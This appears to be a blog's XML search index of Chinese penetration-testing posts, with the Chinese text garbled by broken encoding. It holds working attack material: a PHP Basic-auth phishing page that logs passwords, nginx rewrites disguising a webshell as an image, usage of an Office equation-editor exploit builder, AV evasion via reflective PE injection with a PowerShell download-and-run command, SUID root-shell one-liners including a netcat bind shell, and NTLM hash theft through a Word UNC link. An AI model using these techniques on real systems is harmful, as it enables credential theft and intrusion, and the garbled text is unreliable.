æª¬å¸ˆå‚…çš„php.iniæ„æˆçš„åé—¨ã€‚é‚£ä¹ˆè·Ÿrewriteæœ‰ä»€ä¹ˆå…³ç³»å‘¢ã€‚å…¶å®rewriteä¸»è¦æ˜¯ä¸ºäº†é€ƒé¿æ—¥å¿—å®¡æŸ¥ï¼Œé€šè¿‡rewriteï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è®¿é—®ä¸€ä¸ªå›¾ç‰‡åç¼€çš„æ–‡ä»¶æ¥æ‰§è¡Œæˆ‘ä»¬çš„webshellï¼Œä½†æ˜¯ä¿®æ”¹è¿™äº›é…ç½®æ–‡ä»¶éœ€è¦ä¸€å®šçš„æƒé™ã€‚ä¸‹é¢æ¥è¿›è¡Œä¸€ä¸‹ç®€å•çš„ä»‹ç»ã€‚æµ‹è¯•çš„æ—¶å€™ä¸»è¦æ˜¯ä½¿ç”¨nginx,æ‰€ä»¥å¯¹nginxè¿›è¡Œä¸€ä¸‹ä»‹ç»ï¼Œå…³äºapacheçš„é…ç½®æœ‰å…´è¶£å¯ä»¥è‡ªå·±å»æŸ¥ä¸€æ³¢ã€‚ä¸‹é¢æ˜¯æˆ‘çš„é…ç½®ï¼šngingx.conf1234567891011121314151617181920212223worker_processes 1;events &#123; worker_connections 1024;&#125;http &#123; include mime.types; default_type application/octet-stream; sendfile on; keepalive_timeout 65; include /usr/local/nginx/vhosts/*.conf; server &#123; listen 80; server_name localhost; location / &#123; root html; index index.html index.htm; &#125; error_page 500 502 503 504 /50x.html; location = /50x.html &#123; root html; &#125; &#125;&#125; é…ç½®äº†å¤šä¸ªåŸŸåçš„é…ç½®ï¼Œæ‰€ä»¥é’ˆå¯¹æŸä¸ªåŸŸåçš„é…ç½®æ–‡ä»¶åœ¨vhostsé‡Œé¢ï¼Œè¦é…ç½®çš„åŸŸåçš„é…ç½®æ–‡ä»¶ï¼šmydomain.conf12345678910111213141516171819202122232425262728293031server &#123; listen 80; server_name mydomain.com; root /www/mydomain; index index.html index.php; if ( $query_string ~* ".*[\;'\&lt;\&gt;].*" )&#123; return 404; &#125; location ~ .*\.(gif|jpg|jpeg|bmp|png|swf|flv|ico)$ &#123; expires 30d; &#125; location ~ .*\.(js|css)?$ &#123; expires 7d; &#125; location ~ \.php$ &#123; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; include fastcgi_params; #è®¾ç½®PATH_INFOå¹¶æ”¹å†™SCRIPT_FILENAME,SCRIPT_NAMEæœåŠ¡å™¨ç¯å¢ƒå˜é‡ set $fastcgi_script_name2 $fastcgi_script_name; if ($fastcgi_script_name ~ "^(.+\.php)(/.+)$") &#123; set $fastcgi_script_name2 $1; set $path_info $2; &#125; fastcgi_param PATH_INFO $path_info; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name2; fastcgi_param SCRIPT_NAME $fastcgi_script_name2; &#125;&#125; è¦é…ç½®é‡å®šå‘å¾ˆç®€å•ï¼Œåªéœ€è¦åŠ å…¥123location ~ \.png$ &#123;rewrite ^/img/test\.png$ /img/test.php last;&#125; æ„æ€æ˜¯åŒ¹é…ä»¥pngç»“å°¾çš„urlï¼Œå¦‚æœåŒ¹é…åˆ° img/test.pngï¼Œåˆ™é‡å®šå‘åˆ° img/test.phpï¼Œæ‰€ä»¥ï¼Œåªéœ€è¦åœ¨imgç›®å½•ä¸‹å­˜æ”¾test.phpï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡è®¿é—® http://domain.com/img/test.pngæ¥è®¿é—®ã€‚å¦‚ä¸‹å›¾: å…³äºæ›´å¤šåŒ¹é…çš„è§„åˆ™ï¼Œå¯ä»¥çœ‹è¿™ç¯‡æ–‡ç« ã€‚ é…ç½®å®Œéœ€è¦é‡å¯nginxæœåŠ¡ã€‚ 0x02 åŸºç¡€è®¤è¯é’“é±¼å…³äºåŸºç¡€è®¤è¯é’“é±¼ï¼Œå…¶å®å¾ˆæ—©ä¹‹å‰å°±å·²ç»æœ‰æ–‡ç« ä»‹ç»è¿‡äº†ï¼Œæ¯”å¦‚å¦‚ä½•åˆ¶ä½œåŸºç¡€è®¤è¯é’“é±¼é¡µé¢ã€‚å…¶å®åŸç†å°±æ˜¯åœ¨é¡µé¢ä¸­æ’å…¥ä¸€ä¸ªphpçš„imgï¼Œå³:1&lt;img src="http://site.com/1.php"alt="Could not load image - Invalid credentils."/&gt;&gt; phpçš„ä»£ç å°±æ˜¯401çš„éªŒè¯ï¼Œå½“ç”¨æˆ·æ‰“å¼€è¿™ä¸ªé¡µé¢çš„æ—¶å€™ï¼Œç”±äºè¯·æ±‚äº†http://site.com/1.phpï¼Œæ‰€ä»¥ä¼šå¼¹å‡ºéªŒè¯çš„é¡µé¢ï¼Œç”¨æˆ·è¾“å…¥è´¦å·å¯†ç ä¹‹åï¼Œå¯†ç åˆ™ä¼šè¢«æ”»å‡»è€…è®°å½•ã€‚ æ³¨ï¼šè¿™ç§æ–¹æ³•é€‚ç”¨äºFirefoxå’ŒIEæµè§ˆå™¨ï¼ŒChromeå¹¶ä¸ä¼šå¼¹å‡ºåŸºç¡€è®¤è¯çª—å£ã€‚ ä¸ºäº†è®©æ­¤æ”»å‡»è¾¾åˆ°æ›´å¥½åœ°éšè”½æ•ˆæœï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨rewriteæ¥é‡å†™urlã€‚åˆ™ä½¿å¾—è®¿é—®çš„é“¾æ¥æ–‡ä»¶åç¼€ä¸ºä¸€ä¸ªå›¾ç‰‡ã€‚ä¸ºäº†è¾¾åˆ°æ›´å¥½åœ°æ”»å‡»æ•ˆæœï¼Œå†™äº†ä»¥ä¸‹phpä»£ç ï¼š1234567891011121314151617181920&lt;?php$now = new DateTime();$user = isset($_SERVER['PHP_AUTH_USER']) ? $_SERVER['PHP_AUTH_USER'] : "";$pass = isset($_SERVER['PHP_AUTH_PW']) ? $_SERVER['PHP_AUTH_PW'] : "";if ($user &amp;&amp; $pass)&#123; $fp = fopen("count.txt", "a"); $content = fread($fp); $ip = $_SERVER["REMOTE_ADDR"]; $all = file_get_contents("count.txt"); fwrite($fp, $now-&gt;format("Y-m-d H:i:s") . "\t" . $ip . "\t" . $user . ":" . $pass . "\n"); $line = substr_count($all,$ip); fclose($fp);&#125;if($line &lt; 2)&#123; header('WWW-Authenticate: Basic realm="Corporate domain"');&#125;else&#123; header('content-type: image/png'); echo file_get_contents("test.png");&#125;?&gt; ä»£ç çš„åŠŸèƒ½å°±æ˜¯å¼¹å‡ºè®¤è¯çª—å£ï¼Œç­‰å¾…ç”¨æˆ·è¾“å…¥ï¼Œå¹¶å°†è¾“å…¥çš„è´¦å·å¯†ç å­˜åˆ°count.txtï¼Œå¦‚æœæ­¤ç”¨æˆ·è¾“å…¥å·²è¾¾3æ¬¡ï¼ˆä¸€æ¬¡è¾“å…¥å¯èƒ½æ˜¯éšä¾¿è¾“å…¥çš„è´¦å·å¯†ç ï¼‰ï¼Œåˆ™è¾“å‡ºæ­£å¸¸å›¾ç‰‡ã€‚æ¼”ç¤ºå¦‚ä¸‹ï¼š å½“ç„¶ï¼Œä½ å¯ä»¥è‡ªå·±å®šä¹‰å…¶ä»–åŠŸèƒ½ï¼Œæ¯”å¦‚å°†è´¦å·å¯†ç å‘é€åˆ°é‚®ç®±ç­‰ç­‰ã€‚ phpä»£ç å†™å¥½äº†ï¼Œæ€ä¹ˆåˆ©ç”¨å‘¢ï¼Ÿå…¶å®æˆ‘ä»¬è¦åšåˆ°å°±æ˜¯æ‰¾å„ç§ç¼–è¾‘å™¨ï¼Œæ‰¾é‚£ç§å¯ä»¥è¿œç¨‹æ’å…¥å›¾ç‰‡çš„ï¼Œç„¶åæ’å…¥æˆ‘ä»¬çš„é“¾æ¥ï¼Œå¦‚æœç½‘ç«™ç›´æ¥æŠŠé“¾æ¥æ’å…¥ç½‘ç«™ï¼Œé‚£ä¹ˆåœ¨åŠ è½½çš„æ—¶å€™ï¼Œå°±ä¼šåŠ è½½æˆ‘ä»¬çš„éªŒè¯é¡µé¢ã€‚rewriteé™¤äº†å¯ä»¥è®©åç¼€çœ‹èµ·æ¥æ˜¯ä¸€ä¸ªå›¾ç‰‡æ–‡ä»¶ï¼Œå…¶å®è¿˜å¯ä»¥å¯¹ä¸€äº›ç¼–è¾‘å™¨è¿›è¡Œç»•è¿‡ï¼Œæ¯”å¦‚æ’å…¥è¿œç¨‹å›¾ç‰‡çš„æ—¶å€™ï¼Œç¼–è¾‘å™¨å¯¹å›¾ç‰‡è¿›è¡Œé¢„è§ˆ: ç¢°åˆ°è¿™ç§æƒ…å†µï¼Œæˆ‘ä»¬å¯ä»¥é¦–å…ˆä½¿ç”¨é»˜è®¤é…ç½®çš„nginxæ’å…¥å›¾ç‰‡ï¼Œå¦‚ä¸‹å›¾ï¼š æ’å…¥æˆåŠŸå¹¶æäº¤ä»¥åï¼Œå†é‡æ–°ä¿®æ”¹rewriteã€‚è¿™æ ·å¯ä»¥è¿›è¡Œä¸€äº›ç»•è¿‡ã€‚æŸç§æƒ…æ™¯çš„æ”»å‡»å¦‚ä¸‹ï¼šdemo: ä¸ºäº†è¾¾åˆ°æ›´å¥½åœ°æ•ˆæœã€‚æ”»å‡»è€…å¯ä»¥æ³¨å†Œä¸€ä¸ªçœ‹èµ·æ¥å—ä¿¡ä»»çš„åŸŸåã€‚æ¯”å¦‚è¯´ï¼Œå¦‚æœæ”»å‡»è€…çš„ç›®æ ‡æ˜¯targetdomain.comï¼Œé‚£ä¹ˆä»–å°±å¯ä»¥æ³¨å†Œå¦‚ä¸‹çš„ç±»ä¼¼åœ°å€ï¼š1234567targetdomain.cotargetdomain.nettarget-domain.comtargetdomain-oauth.comtargetdomain-cdn.comtargetdomain-images.comlogin-targetdomain.com]]></content>
  </entry>
  <entry>
    <title><![CDATA[CVE-2018-0802åˆ©ç”¨]]></title>
    <url>%2Farchives%2FCVE_2018_0802.html</url>
    <content type="text"><![CDATA[åœ¨CVE-2017-11882ä¹‹åï¼Œ2018å¹´1æœˆä»½åˆå‡ºäº†ä¸€ä¸ªæ–°çš„â€œå™©æ¢¦å…¬å¼äºŒä»£â€ï¼Œåœ¨é‡æ ·æœ¬åµŒå…¥äº†åˆ©ç”¨Ndayæ¼æ´å’Œ0dayæ¼æ´çš„2ä¸ªå…¬å¼å¯¹è±¡åŒæ—¶è¿›è¡Œæ”»å‡»ï¼ŒNdayæ¼æ´å¯ä»¥æ”»å‡»æœªæ‰“è¡¥ä¸çš„ç³»ç»Ÿï¼Œ0dayæ¼æ´åˆ™æ”»å‡»å…¨è¡¥ä¸ç³»ç»Ÿï¼Œç»•è¿‡äº†CVE-2017-11882è¡¥ä¸çš„ASLRï¼ˆåœ°å€éšæœºåŒ–ï¼‰å®‰å…¨ä¿æŠ¤æªæ–½ï¼Œæ”»å‡»æœ€ç»ˆå°†åœ¨ç”¨æˆ·ç”µè„‘ä¸­æ¤å…¥æ¶æ„çš„è¿œç¨‹æ§åˆ¶ç¨‹åºã€‚å…³äºæ­¤æ¼æ´çš„åˆ†æï¼Œå¯ä»¥çœ‹è¿™é‡Œï¼Œä»Šå¤©çœ‹åˆ°åœ¨githubå…¬å¼€äº†ä¸€ä¸ªCVE-2018-0802çš„åˆ©ç”¨è„šæœ¬ï¼Œåœ°å€åœ¨è¿™ï¼Œä¸ºäº†è¾¾åˆ°æœ€å®Œç¾çš„åˆ©ç”¨ï¼Œæ‰€ä»¥ç¼–å†™äº†RTF_11882_0802ã€‚ GITï¼šRTF_11882_0802 æ­¤è„šæœ¬é›†åˆäº†ä¸¤ä¸ªå…¬å¼åˆ©ç”¨æ¼æ´ã€‚ åˆ©ç”¨æ–¹å¼ä¸ä¹‹å‰çš„æ–¹å¼ä¸€æ ·ã€‚1python RTF_11882_0802.py -c "cmd.exe /c calc.exe" -i test.rtf -o test.doc å…¶å®å°±æ˜¯ç®€å•ç²—æš´çš„æŠŠä¸¤ä¸ªå…¬å¼ç¼–è¾‘å™¨æ’å…¥æ–‡æ¡£ä¸­ï¼Œä¸€ä¸ªæ˜¯11882ï¼Œä¸€ä¸ªæ˜¯0802ã€‚ â€œå™©æ¢¦å…¬å¼äºŒä»£â€ï¼ˆCVE-2018-0802ï¼‰æ‰€ä½¿ç”¨çš„0dayæ¼æ´å ªç§°CVE-2017-11882çš„åŒèƒèƒæ¼æ´ï¼Œæ”»å‡»æ ·æœ¬ä¸­çš„ä¸€ä¸ªæ¼æ´é’ˆå¯¹æœªæ‰“è¡¥ä¸å‰çš„ç³»ç»Ÿï¼Œå¦å¤–ä¸€ä¸ªæ¼æ´é’ˆå¯¹æ‰“è¡¥ä¸åçš„ç³»ç»Ÿï¼Œåˆ©ç”¨ä¸¤ä¸ªOLEåŒæ—¶è¿›è¡Œæ”»å‡»ï¼Œé»‘å®¢ç²¾å¿ƒæ„é€ çš„æ”»å‡»å®Œç¾å…¼å®¹äº†ç³»ç»Ÿæ¼æ´è¡¥ä¸ç¯å¢ƒçš„ä¸åŒæƒ…å†µã€‚è¿™ä¸ªæ¼æ´çš„åˆ©ç”¨æŠ€å·§å’ŒBypass ASLRçš„æ–¹å¼éƒ½å¸¦æœ‰ä¸€å®šçš„å·§åˆæ€§ï¼Œå‡å¦‚EQNEDT32.EXEæ¨¡å—å†…æ²¡æœ‰ä¸€æ¡æ»¡è¶³æ¡ä»¶çš„retæŒ‡ä»¤å¯ä»¥ç”¨æ¥ç»•è¿‡ASLRï¼Œå‡å¦‚lpLogFontä¸æ˜¯sub_21774çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œå‡å¦‚CVE-2017-11882çš„è¡¥ä¸ä¿®å¤æ–¹å¼å¼ºåˆ¶å¼€å¯äº†DEPä¿æŠ¤ï¼Œâ€œå™©æ¢¦å…¬å¼äºŒä»£â€å°†æ²¡æœ‰å¯ä¹˜ä¹‹æœºã€‚ è§£å†³æ–¹æ¡ˆä¸€ã€åŠæ—¶æ›´æ–°è¡¥ä¸ è¡¥ä¸ä¸‹è½½åœ°å€ï¼š https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-0802 äºŒã€é€šè¿‡æ³¨å†Œè¡¨ç¦ç”¨æ­¤æ¨¡å—ï¼Œå¯é€šè¿‡ä¿®æ”¹æ³¨å†Œè¡¨ï¼Œç¦ç”¨ä»¥ä¸‹COMæ§ä»¶çš„æ–¹å¼è¿›è¡Œç¼“è§£ï¼Œå…¶ä¸­XX.Xä¸ºç‰ˆæœ¬å· åœ¨è¿è¡Œä¸­è¾“å…¥ï¼š1reg add â€œHKLM\SOFTWARE\Microsoft\Office\XX.X\Common\COMCompatibility\&#123;0002CE02-0000- 0000-C000-000000000046&#125;â€ /vâ€Compatibility Flagsâ€ /t REG_DWORD /d 0Ã—400 1reg addâ€HKLM\SOFTWARE\Wow6432Node\Microsoft\Office\XX.X\Common\COMCompatibility\&#123;0002CE02-0000-0000-C000-000000000046&#125;â€ /vâ€Compatibility Flagsâ€ /t REG_DWORD /d 0Ã—400 æ³¨ï¼šæ­¤è„šæœ¬åªæ˜¯ä¸ºäº†å®‰å…¨ç ”ç©¶ï¼Œåˆ‡å‹¿éæ³•ä½¿ç”¨ï¼ä½¿ç”¨æ­¤è„šæœ¬æ‰€é€ æˆçš„ä¸€åˆ‡æ³•å¾‹é—®é¢˜åŠåæœï¼Œæœ¬ç«™æ¦‚ä¸è´Ÿè´£ï¼]]></content>
      <categories>
        <category>å¥‡æŠ€æ·«å·§</category>
      </categories>
      <tags>
        <tag>office</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BypassAV With ReflectivePEInjection]]></title>
    <url>%2Farchives%2FBypassAV_With_ReflectivePEInjection.html</url>
    <content type="text"><![CDATA[æœ‰æ—¶å€™ï¼Œä½¿ç”¨æŸäº›expè¿›è¡Œææƒçš„æ—¶å€™ï¼Œexpå¯èƒ½ä¼šè¢«æŸ¥æ€ï¼Œå½“ç„¶ï¼Œæœ‰æºç çš„è¯ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨æºç ä¸Šè¿›è¡Œä¿®æ”¹è¿›è¡Œå…æ€å¤„ç†ï¼Œä½†æ˜¯ä»Šå¤©ä»‹ç»çš„æ˜¯å¦å¤–ä¸€åªæ–¹æ³•ï¼Œå³ä½¿ç”¨PEloaderæ¥åŠ è½½expã€‚powershellçš„PEloaderåœ¨è¿™é‡Œï¼ŒæŸ¥çœ‹ä»£ç æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œè¿™ä¸ªè„šæœ¬ä½¿ç”¨éå¸¸ç®€å•ï¼Œå…·ä½“ä»£ç å¦‚ä¸‹ï¼š12$PEBytes = [IO.File]::ReadAllBytes('DemoEXE.exe')Invoke-ReflectivePEInjection -PEBytes $PEBytes -ExeArgs "Arg1 Arg2 Arg3 Arg4" è·å–expçš„å­—èŠ‚æµï¼Œä¹‹åå†åœ¨å†…å­˜ä¸­åŠ è½½expï¼Œæ‰€ä»¥æ€è·¯ä¹Ÿå¾ˆç®€å•ï¼Œæˆ‘ä»¬åªéœ€è¦æŠŠéœ€è¦çš„expè½¬æ¢æˆå­—ç¬¦ä¸²ï¼Œå†™å…¥è„šæœ¬ï¼Œå°±å¯ä»¥æ„é€ ä¸€ä¸ªpowershellè„šæœ¬ã€‚ è¿™é‡Œæ•´ç†äº†ä¸€ä¸ªè„šæœ¬æ–¹ä¾¿è½¬æ¢ï¼š123456789101112131415161718function Convert-BinaryToString &#123; [CmdletBinding()] param ( [string] $FilePath ) try &#123; $ByteArray = [System.IO.File]::ReadAllBytes($FilePath); &#125; catch &#123; throw "Failed to read file. Ensure that you have permission to the file, and that the file path is correct."; &#125; if ($ByteArray) &#123; $Base64String = [System.Convert]::ToBase64String($ByteArray); &#125; else &#123; throw '$ByteArray is $null.'; &#125; $Base64String | set-content ("b64.txt")&#125; ä½¿ç”¨zcgonvhçš„16032åšæ¼”ç¤ºã€‚ä½¿ç”¨è„šæœ¬è½¬æ¢ï¼š12PS C:\Users\evi1cg\Desktop\16_032&gt; . .\Convert-BinaryToString.ps1PS C:\Users\evi1cg\Desktop\16_032&gt; Convert-BinaryToString -FilePath .\ms16-032_x64.exe ç”Ÿæˆbase64çš„å­—ç¬¦ä¸²å¹¶å­˜å‚¨åœ¨b64.txtä¸­ã€‚ ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤è¿›è¡Œè½¬æ¢ï¼š12$InputString = "base64string"$PEBytes = [System.Convert]::FromBase64String($InputString) ä¹‹åå°±å¯ä»¥ä½¿ç”¨1Invoke-ReflectivePEInjection -PEBytes $PEBytes è¿›è¡ŒåŠ è½½ï¼Œæœ€ååˆ†äº«ä¸€ä¸‹æœ€ç»ˆçš„è„šæœ¬ï¼š E2P_MS16-032.ps1 ä½¿ç”¨æ–¹å¼ä¸ºï¼š1E2P_MS16-032 -Command '"net user"' è„šæœ¬GITï¼šPentestã€‚ è¿œç¨‹åŠ è½½å‘½ä»¤ï¼š1powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/E2P_MS16-032.ps1');E2P_MS16-032 -Command '\"whoami\"'"]]></content>
      <categories>
        <category>å¥‡æŠ€æ·«å·§</category>
      </categories>
      <tags>
        <tag>Powershell</tag>
        <tag>bypassav</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SUID Privilege Escalation]]></title>
    <url>%2Farchives%2FSUID_Privilege_Escalation.html</url>
    <content type="text"><![CDATA[Linuxææƒä¸­ï¼Œå¯ä»¥ç”¨çš„SUIDæ–‡ä»¶æ¥ææƒï¼ŒSUIDçš„ä½œç”¨å°±æ˜¯ï¼šè®©æœ¬æ¥æ²¡æœ‰ç›¸åº”æƒé™çš„ç”¨æˆ·è¿è¡Œè¿™ä¸ªç¨‹åºæ—¶ï¼Œå¯ä»¥è®¿é—®æ²¡æœ‰æƒé™è®¿é—®çš„èµ„æºã€‚é€šå¸¸å¯ä»¥ä½¿ç”¨ä¸€ä¸‹å‘½ä»¤æ¥æ‰¾æœ‰SUIDæ ‡å¿—ä½çš„æ–‡ä»¶ï¼š123find / -user root -perm -4000 -print 2&gt;/dev/nullfind / -perm -u=s -type f 2&gt;/dev/nullfind / -user root -perm -4000 -exec ls -ldb &#123;&#125; \; ä¾‹å¦‚nmap12ls -l /usr/bin/nmap-rwsr-xr-x 1 root root 780676 2008-04-08 10:04 /usr/bin/nmap å­˜åœ¨s åˆ™è¡¨ç¤ºå…¶å­˜åœ¨SUIDæ ‡å¿—ä½ï¼Œå¹¶æ‹¥æœ‰rootçš„æ‰§è¡Œæƒé™ã€‚ä»¥ä¸‹æ˜¯å‡ ç±»å¯ç”¨äºææƒçš„æ–‡ä»¶æ€»ç»“ï¼š 1.Nmapè€ç‰ˆæœ¬çš„nmapï¼ˆ2.02-5.21ï¼‰æœ‰ interactiveï¼Œæ˜¯å…è®¸ç”¨æˆ·æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„ã€‚ææƒæ–¹å¼1nmap --interactive ä¹‹åæ‰§è¡Œå‘½ä»¤ï¼š123nmap&gt; !shsh-3.2# whoamiroot msfä¸­çš„æ¨¡å—ä¸ºï¼š1exploit/unix/local/setuid_nmap 2.Find12touch testfind test -exec whoami \; å¦‚æœæœåŠ¡å™¨ä¸Šè£…äº†ncï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤è¿›è¡Œç›‘å¬ï¼š1find test -exec netcat -lvp 5555 -e /bin/sh \; ä¹‹åè¿›è¡Œè¿æ¥ï¼š1netcat 192.168.1.100 5555 åˆ™å¯è·å–root shell 3.vim/viæ‰“å¼€vim,æŒ‰ä¸‹ESC12:set shell=/bin/sh:shell åˆ™å¯æ‰§è¡Œå‘½ä»¤ 4.bash123bash -pbash-3.2# iduid=1002(service) gid=1002(service) euid=0(root) groups=1002(service) 5.less12less /etc/passwd!/bin/sh 6.more12more /home/pelle/myfile!/bin/bash 7.cpä½¿ç”¨cpè¦†ç›– /etc/shadow 8.mvä½¿ç”¨mv è¦†ç›– /etc/shadow æˆ–è€…/etc/sudoers 9.awk1awk 'BEGIN &#123;system("/bin/bash")&#125;' 10.man12man passwd!/bin/bash 11.python/perl/ruby/lua/etcperl1exec "/bin/bash"; python12import osos.system("/bin/bash") 12.tcpdump123echo $'id\ncat /etc/shadow' &gt; /tmp/.testchmod +x /tmp/.testsudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root æ¬¢è¿è¡¥å……ã€‚]]></content>
      <categories>
        <category>å¥‡æŠ€æ·«å·§</category>
      </categories>
      <tags>
        <tag>Privilege Escalation</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[é€šè¿‡Microsoft Office çªƒå– NTLM Hashes]]></title>
    <url>%2Farchives%2FGet_NTLM_Hashes.html</url>
    <content type="text"><![CDATA[ä¹‹å‰æœ‰äººæ€»ç»“äº†å¾ˆå¤šç§çªƒå–NTLM hashçš„æ–¹æ³•ï¼ŒåŸæ–‡,è¯‘æ–‡ã€‚é‡Œé¢å†™çš„æ–¹æ³•å·²ç»å¾ˆå¤šäº†ï¼Œæœ€è¿‘ä»è¿™é‡Œåˆå­¦åˆ°äº†ä¸€ä¸ªæ–°çš„æ–¹æ³•ï¼Œæ‰€ä»¥åœ¨è¿™é‡Œè¿›è¡Œä¸€ä¸‹åˆ†äº«ï¼Œä¹Ÿç®—æ˜¯ä¸€ä¸ªè¡¥å……ã€‚ å†å²ä¸Šï¼ŒMicrosoft Wordè¢«ç”¨ä½œHTMLç¼–è¾‘å™¨ã€‚è¿™æ„å‘³ç€å®ƒå¯ä»¥æ”¯æŒHTMLå…ƒç´ ï¼Œä¾‹å¦‚æ¡†æ¶é›†ã€‚å› æ­¤ï¼Œå¯ä»¥å°†Microsoft Wordæ–‡æ¡£ä¸UNCè·¯å¾„é“¾æ¥èµ·æ¥ï¼Œå¹¶å°†å…¶ä¸å“åº”ç¨‹åºç»“åˆï¼Œä»¥ä¾¿ä»å¤–éƒ¨æ•è·NTLMå“ˆå¸Œå€¼ã€‚å¸¦æœ‰docxæ‰©å±•åçš„Wordæ–‡æ¡£å®é™…ä¸Šæ˜¯ä¸€ä¸ªåŒ…å«å„ç§XMLæ–‡æ¡£çš„zipæ–‡ä»¶ã€‚è¿™äº›XMLæ–‡ä»¶æ­£åœ¨æ§åˆ¶ä¸»é¢˜ï¼Œå­—ä½“ï¼Œæ–‡æ¡£çš„è®¾ç½®å’ŒWebè®¾ç½®ã€‚ æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ–°å»ºä¸€ä¸ªä»»æ„æ–‡æ¡£ï¼Œå¹¶ç”¨å‹ç¼©åŒ…æ¥æ‰“å¼€ä»–ã€‚ åœ¨word ç›®å½•ä¸‹æœ‰ä¸€ä¸ªwebSettings.xmlã€‚æˆ‘ä»¬å¯¹è¿™ä¸ªæ–‡ä»¶è¿›è¡Œä¿®æ”¹ï¼Œæ·»åŠ ä»¥ä¸‹ä»£ç åˆ™ä¼šåˆ›å»ºä¸å¦å¤–ä¸€ä¸ªæ–‡ä»¶çš„é“¾æ¥ã€‚1234567891011121314&lt;w:frameset&gt;&lt;w:framesetSplitbar&gt;&lt;w:w w:val="60"/&gt;&lt;w:color w:val="auto"/&gt;&lt;w:noBorder/&gt;&lt;/w:framesetSplitbar&gt;&lt;w:frameset&gt;&lt;w:frame&gt;&lt;w:name w:val="3"/&gt;&lt;w:sourceFileName r:id="rId1"/&gt;&lt;w:linkedToFile/&gt;&lt;/w:frame&gt;&lt;/w:frameset&gt;&lt;/w:frameset&gt; æœ€ç»ˆä¿®æ”¹åçš„webSettings.xmlå¦‚ä¸‹ï¼š1234567891011121314151617&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;&lt;w:webSettings xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:w14="http://schemas.microsoft.com/office/word/2010/wordml" mc:Ignorable="w14"&gt; &lt;w:frameset&gt;&lt;w:framesetSplitbar&gt;&lt;w:w w:val="60"/&gt;&lt;w:color w:val="auto"/&gt;&lt;w:noBorder/&gt;&lt;/w:framesetSplitbar&gt;&lt;w:frameset&gt;&lt;w:frame&gt;&lt;w:name w:val="3"/&gt;&lt;w:sourceFileName r:id="rId1"/&gt;&lt;w:linkedToFile/&gt;&lt;/w:frame&gt;&lt;/w:frameset&gt;&lt;/w:frameset&gt;&lt;w:optimizeForBrowser/&gt;&lt;w:allowPNG/&gt;&lt;/w:webSettings&gt; ç°åœ¨æˆ‘ä»¬æŠŠæ–°çš„webSettings.xmlæ›¿æ¢åŸæ¥çš„webSettings.xmlï¼Œä¹‹ååœ¨wordç›®å½•ä¸‹çš„_relsç›®å½•åˆ›å»ºä¸€ä¸ªæ–°çš„æ–‡ä»¶ webSettings.xml.relsï¼Œæ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š12345&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;&lt;Relationshipsxmlns="http://schemas.openxmlformats.org/package/2006/relationships"&gt;&lt;Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/frame" Target="\\172.16.103.130\Updates.docx" TargetMode="External"/&gt;&lt;/Relationships&gt; åœ¨è¿™é‡ŒåŒ…å«äº†UNCè·¯å¾„ã€‚æŒ‡å‘æˆ‘ä»¬çš„Responderã€‚ ä¹‹åæŠŠæ–‡æ¡£é‡æ–°å‘½åä¸ºdocxã€‚å¼€å¯Responder1python Responder.py -I eth0 -wrf æ‰“å¼€wordï¼Œåˆ™å¯è·å–åˆ°hash å½“ç„¶ï¼Œä½¿ç”¨DDEçš„æ–¹å¼ä»¥åŠCVE-2017-0199ç­‰å…¶ä»–çš„æ–¹å¼éƒ½æ˜¯å¯ä»¥çš„ã€‚]]></content>
      <categories>
        <category>å¥‡æŠ€æ·«å·§</category>
      </categories>
      <tags>
        <tag>gethash</tag>
        <tag>office</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CVE-2017-11882åˆ©ç”¨]]></title>
    <url>%2Farchives%2FCVE_2017_11882_exp.html</url>
    <content type="text"><![CDATA[æœ€è¿‘è¿™æ®µæ—¶é—´CVE-2017-11882æŒºç«çš„ã€‚å…³äºè¿™ä¸ªæ¼æ´å¯ä»¥çœ‹çœ‹è¿™é‡Œ:éšè—17å¹´çš„Officeè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´POCæ ·æœ¬åˆ†æï¼ˆCVE-2017-11882ï¼‰ã€‚ 